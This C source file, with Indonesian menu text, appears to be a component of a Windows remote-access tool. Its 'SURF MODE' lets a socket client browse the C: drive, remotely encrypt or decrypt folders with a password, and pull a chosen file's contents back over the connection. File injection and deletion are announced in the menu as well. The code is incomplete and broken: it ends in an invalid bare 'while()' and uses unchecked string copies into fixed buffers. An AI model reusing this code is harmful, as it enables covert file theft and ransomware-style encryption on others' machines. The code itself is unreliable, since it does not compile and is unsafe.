#include "seeDirectory.h"

void showMenu(void * paramT) {
	if(paramT == NULL) return;

	paramSurf * paramS = (paramSurf * ) paramT;
	paramThread * param = (paramS)->paramT;

	char buffer[128] = {0};

	strcpy(buffer, "\nPilihan Menu:\n");
	send((param)->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));
	Sleep(11);

	strcpy(buffer, "1. Tampilkan menu\n");
	send((param)->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));
	Sleep(11);

	strcpy(buffer, "2. Lihat isi direktori saat ini\n");
	send((param)->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));
	Sleep(11);

	strcpy(buffer, "3. Tampilkan struktur direktori\n");
	send((param)->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));
	Sleep(11);

	strcpy(buffer, "4. Lihat pwd saat ini\n");
	send((param)->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));
	Sleep(11);

	strcpy(buffer, "5. Enkripsi/Dekripsi file\n");
	send((param)->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));
	Sleep(11);

	strcpy(buffer, "6. GET FILE\n");
	send((param)->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));
	Sleep(11);

	strcpy(buffer, "7. INJECT FILE\n");
	send((param)->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));
	Sleep(11);

	strcpy(buffer, "8. DELETE FILE\n");
	send((param)->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));
	Sleep(11);

	strcpy(buffer, "Input \"END\" untuk keluar dari SURF MODE\n");
	send((param)->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));
	Sleep(11);
}

void showPWD(void * paramS) {
	if(paramS == NULL) return;

	paramSurf * param = (paramSurf *)paramS;

	char buffer[128] = {0};

	Sleep(11);
	sprintf(buffer, "Direktori kerja saat ini: %s\n", (param)->pwd);
	send((param)->paramT->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));
	Sleep(11);
}

void handleEncryption(void * paramS) {
	paramSurf * param = (paramSurf *)paramS;

    char password[256];
    char buffer[256] = {0};

    char encrypted_dir[MAX_PATH];
    char decrypted_dir[MAX_PATH];
    
    char input[10];
    strcpy(buffer, "\nPilih operasi:\n");
	send((param)->paramT->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));
	Sleep(11);

    strcpy(buffer, "1. Enkripsi direktori\n");
	send((param)->paramT->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));
	Sleep(11);

    strcpy(buffer, "2. Dekripsi direktori\n");
	send((param)->paramT->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));
	Sleep(11);

    strcpy(buffer, "Pilih (1-2): \n");
	send((param)->paramT->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));
	Sleep(11);

	strcpy((param)->input, "NULL");

	while(strcmp((param)->input, "NULL")==0) Sleep(500);

    (param)->input[strcspn((param)->input, "\n")] = 0;
    
if ((param)->input[0] == '1' || (param)->input[0] == '2'){

	char choice = (param)->input[0];

    strcpy(buffer, "Masukkan kata sandi: ");
	send((param)->paramT->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));
	Sleep(11);

	strcpy((param)->input, "NULL");

	while(strcmp((param)->input, "NULL")==0) Sleep(500);

	strcpy(password, (param)->input);

    password[strcspn(password, "\n")] = 0;
    if (choice == '1') {
        snprintf(encrypted_dir, sizeof(encrypted_dir), "%s_enc", (param)->pwd);
        sprintf(buffer, "\nMengenkripsi direktori: %s\n", (param)->pwd);
		send((param)->paramT->clientSocket, buffer, strlen(buffer), 0);
		memset(buffer, 0, strlen(buffer));
		Sleep(11);
        
        if (encrypt_folder((param)->pwd, encrypted_dir, password) == 0) {
            sprintf(buffer, "Direktori berhasil dienkripsi ke: %s\n", encrypted_dir);
			send((param)->paramT->clientSocket, buffer, strlen(buffer), 0);
			memset(buffer, 0, strlen(buffer));
			Sleep(11);
        } else {
            strcpy(buffer, "Enkripsi direktori gagal");
			send((param)->paramT->clientSocket, buffer, strlen(buffer), 0);
			memset(buffer, 0, strlen(buffer));
			Sleep(11);
        }
    } else if (choice == '2') {
        snprintf(decrypted_dir, sizeof(decrypted_dir), "%s_dec", (param)->pwd);
        sprintf(buffer, "\nMendekripsi direktori: %s\n", (param)->pwd);
		send((param)->paramT->clientSocket, buffer, strlen(buffer), 0);
		memset(buffer, 0, strlen(buffer));
		Sleep(11);
        if (decrypt_folder((param)->pwd, decrypted_dir, password) == 0) {
            sprintf(buffer, "Direktori berhasil didekripsi ke: %s\n", decrypted_dir);
			send((param)->paramT->clientSocket, buffer, strlen(buffer), 0);
			memset(buffer, 0, strlen(buffer));
			Sleep(11);
        } else {
            strcpy(buffer, "Dekripsi direktori gagal\n");
			send((param)->paramT->clientSocket, buffer, strlen(buffer), 0);
			memset(buffer, 0, strlen(buffer));
			Sleep(11);

        }
    }
} 
    else {
        strcpy(buffer, "Pilihan tidak valid");
		send((param)->paramT->clientSocket, buffer, strlen(buffer), 0);
		memset(buffer, 0, strlen(buffer));
		Sleep(11);
    }
    strcpy(buffer, "Tekan Enter untuk melanjutkan...");
	send((param)->paramT->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));
	Sleep(11);

}

DWORD WINAPI surfMode(LPVOID paramS) {
	if (paramS == NULL) return -1;

	paramSurf * param = (paramSurf *)paramS;

	// Set direktori kerja ke C:
	chdir("C:\\");
	_fullpath((param)->pwd, "C:\\", MAX_PATH);
	
	(param)->dir = opendir((param)->pwd);
	if ((param)->dir == NULL) {
		printf("Tidak dapat membuka direktori.\n");
		return -1;
	}
	
	do {
		strcpy((param)->input, "END");
		while(strcmp((param)->input, "END") == 0) Sleep(50);
		
		// Bersihin newline
		(param)->input[strcspn((param)->input, "\n")] = 0;
		
		switch((param)->input[0]) {
			case '1':
				showMenu(param);
				break;
			case '2':
				seeCurrentDirectory(param);
				break;

			case '3':
				showInorderFile(param);
				break;

			case '4':
				showPWD(param);
				break;

			case '5':
				handleEncryption(param);
				break;

			case '6':	//GET FILE
				showInorderFile(param);
				GETFILE(param);
				break;

			case '7':	//INJECT FILE
				showInorderFile(param);
				break;

			case '8':	//DELETE FILE
				showInorderFile(param);
				break;

			default:
				printf("Pilihan tidak valid!\n");
		}
	} while (true);

	if ((param)->dir != NULL) {
		closedir((param)->dir);
	}

	return 0;
}


void GETFILE(void * paramS){
	paramSurf * param = (paramSurf *) paramS;

	char buffer[512] = {0};

	strcpy(buffer, "\nPILIH FILE YANG AKAN DIAMBIL\n");
	send((param)->paramT->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));
	Sleep(11);

	strcpy((param)->input, "NULL");

	while(strcmp((param)->input, "NULL")==0) Sleep(500);

	strcpy(buffer, (param)->pwd);
	strcat(buffer, "\\");
	strcat(buffer, (param)->input);

	send((param)->paramT->clientSocket, buffer, strlen(buffer), 0);
	Sleep(11);


	FILE * fp = fopen(buffer, "r");

	if(fp == NULL){
		memset(buffer, 0, strlen(buffer));
		strcpy(buffer, "\nGAGAL MEMBUKA FILE\n");
		send((param)->paramT->clientSocket, buffer, strlen(buffer), 0);
		memset(buffer, 0, strlen(buffer));
		
		return;
	}else{
		memset(buffer, 0, strlen(buffer));
		fgets(buffer, sizeof(buffer), fp);
		send((param)->paramT->clientSocket, buffer, strlen(buffer), 0);
		memset(buffer, 0, strlen(buffer));
	}

	while()

	fclose(fp);
}